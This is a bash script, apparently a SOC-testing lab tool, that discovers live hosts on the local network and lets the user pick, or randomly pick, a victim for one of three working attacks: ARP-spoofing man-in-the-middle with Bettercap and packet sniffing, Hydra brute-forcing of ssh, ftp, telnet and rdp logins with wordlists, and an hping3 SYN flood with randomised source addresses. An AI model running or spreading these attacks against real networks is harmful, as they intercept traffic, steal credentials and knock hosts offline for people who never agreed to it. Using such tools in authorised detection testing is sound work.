#!/bin/bash


Attacks="BruteForce MiTM DDoS"
ReturnVar=""
PassFile="./Resources/Cred/10000Pass.txt"
NamesFile="./Resources/Cred/names.txt"
User=$(whoami)
Desc_MiTM="A Man-in-the-Middle (MitM) attack is a cybersecurity threat\nwhere an attacker intercepts,alters, or eavesdrops on communications between two partieswithout their knowledge.\nThe attacker essentially positions themselves in the middle of the communication channel."
Desc_BruteForce="A BruteForce attack is a type of cyber attack in which\nan attacker systematically tries every possible combination of credentials\nor encryption keys until they find the correct one.\nThis approach relies on sheer computational power\nand persistence to break through security mechanisms."
Desc_DDoS="A Distributed Denial of Service (DDoS) attack is a type of cyber attack\nwhere multiple systems, often compromised through malware or hacking,\nare used to flood a target system, such as a website, server, or network,\nwith a massive volume of traffic. The goal is to overwhelm the target,\ncausing it to slow down, crash, or become completely inaccessible to legitimate users."
Date=$(date)
stop_attack="false"


# Function to continuously check for user input and stop the attack when 'x' or 'X' is pressed
function XToStop() {
    while true; do
        read -r input
        # If the user inputs 'x' or 'X', stop the attack
        if [[ "$input" == "x" || "$input" == "X" ]]; then
            echo "[+] Stopping attack..."
            # Terminate the process with the provided PID
            kill "$1"
            # Wait for the process to terminate completely
            wait "$1" 2>/dev/null
            echo "[+] Attack stopped."
            stop_attack="true"
            break
        fi
    done
}

# Function to perform a MITM attack on a specified IP using Bettercap
function MiTM() {
    # Display the definition of a MITM attack
    echo -e "Attack definition:\n________________\n$Desc_MiTM\n________________\n"
    # Install Bettercap if not already installed
    apt-get install bettercap -y > /dev/null 2>&1
    echo "[+] Starting MITM attack on $1 using Bettercap..."
    echo "Press 'x' to stop the attack at any time"
    sleep 3
    # Start Bettercap with specified options and redirect output to a log file
    bettercap -iface eth0 -eval "net.probe on; set arp.spoof.fullduplex true; set arp.spoof.targets $1; arp.spoof on; set net.sniff.local true; net.sniff on" > MITM_$1.txt &
    pid=$!
    # Monitor for user input to stop the attack
    XToStop "$pid"
}

# Function to perform a brute-force attack on a specified IP using Hydra
function BruteForce() {
    # Display the definition of a brute-force attack
    echo -e "Attack definition:\n________________\n$Desc_BruteForce\n________________\n"
    echo "[+] Starting BruteForce attack on $1 using Hydra..."
    echo "Press 'x' to stop the attack at any time"
    sleep 3

    # Define services to target for brute-force attacks
    servicestobrute="ssh ftp telnet rdp"
    # Get the list of open services on the target IP
    services=$(nmap -Pn -sV $1 | grep "open" | awk '{print $3}')
    # Loop through the detected services
    for service in $services; do
        # Check if the attack was stopped
        if [ "$stop_attack" == "true" ]; then
            break
        fi
        echo "$service"
        # If the service is in the list of target services, attempt brute-forcing
        if [[ "$servicestobrute" == *"$service"* ]]; then
            echo "Attempting BruteForce on $service"
            hydra -q -f -L $NamesFile -P $PassFile -o "HydraRes_$service.txt" $service://$1 > BruteForce_$1.txt &
            pid=$!
            # Monitor for user input to stop the attack
            XToStop "$pid"
        fi
    done

    echo "[+] BruteForce attack was performed on $1."
}

# Function to perform a DDoS attack on a specified IP
function DDoS() {
    # Display the definition of a DDoS attack
    echo -e "Attack definition:\n________________\n$Desc_DDoS\n________________\n"
    target_port="${2:-80}"  # Default port is 80 if not specified
    packets_per_second="${3:-1000}"  # Default to 1000 packets per second

    echo "[+] Initiating DDoS attack on $1:$target_port with $packets_per_second packets per second..."
    echo "Press 'x' to stop the attack at any time"
    sleep 3
    # Start a simple flood attack using hping3
    sudo hping3 -c 10000 -d 120 -S -w 64 -p "$target_port" --flood --rand-source "$1" > DDoS_$1.txt &
    pid=$!
    # Monitor for user input to stop the attack
    XToStop "$pid"
    echo "[+] DDoS attack completed."
}

# Function to generate a random number between 1 and the number of words in a string
GetRandomNumber() {
    string=$(echo "$1" | sed -E 's/[[:space:]]+/ /g')
    max=$(echo "$string" | wc -w)
    echo $((1 + $RANDOM % max))
}

# Function to discover all active IPs in the local network
GetLANIPs() {
    # Get the network interface name
    interface=$(ip route | grep '^default' | awk '{print $5}')
    
    # Get the network range in CIDR notation for the interface
    network_range=$(ip -o -f inet addr show "$interface" | awk '/scope global/ {print $4}')
    
    # Use nmap to scan the network range for active hosts and output their IPs
    nmap -sn "$network_range" -oG - | awk '/Up$/{print $2}'
}

# Function to prompt the user to retry or quit if an invalid selection is made
RetryOrQuit() {
    echo -e "Option unavailable\nWould you like to Retry or Quit? [R/Q]"
    read retry
    case $retry in
        R|r)
            # Retry the selection process
            SelectOrRandom "$1"
            return  # Exit after retrying
        ;;
        *)
            echo "Goodbye"
            exit
        ;;
    esac
}

# Function to prompt the user to select an option or pick a random one
SelectOrRandom() {
    # Display the list of options with line numbers
    string=$(echo -e "$1" | sed 's/ /\n/g')
    echo -e "$string" | nl

    # Prompt the user for a selection
    echo -e "Make a selection from the list above or type [R] for random:"
    read Selection

    case $Selection in
        [0-9]*)
            # Check if the selection is within the valid range
            if [ "$Selection" -gt 0 ] && [ "$Selection" -le $(echo "$string" | wc -l) ]; then
                index_number=$Selection
            else
                RetryOrQuit "$string"
                return  # Exit after handling invalid input
            fi
        ;;
        r|R)
            # Select a random index
            index_number=$(GetRandomNumber "$string")
        ;;
        *)
            RetryOrQuit "$string"
            return  # Exit after handling invalid input
        ;;
    esac

    # Output the selected line
    ReturnVar=$(echo "$string" | sed -n "${index_number}p")
    echo "$ReturnVar selected"
}

# Function to initialize the attack process
init() {
    if [ "$User" == "root" ]; then
        echo "Select an attack:"
        SelectOrRandom "$Attacks"
        Attack="$ReturnVar"
        availableIPs="$(GetLANIPs)"
        if [ -n "$availableIPs" ]; then
            echo "Select a victim"
            SelectOrRandom "$availableIPs"
            Victim="$ReturnVar"
            eval "$Attack" "$Victim"
            echo "$Attack attack performed on: $Victim $Date" >> /var/log/SOCChecker.txt
        else
            echo "No available IPs in LAN. Try again later."
        fi
    else
        echo "You must be root to use this app."
    fi
}

# Start the script
init
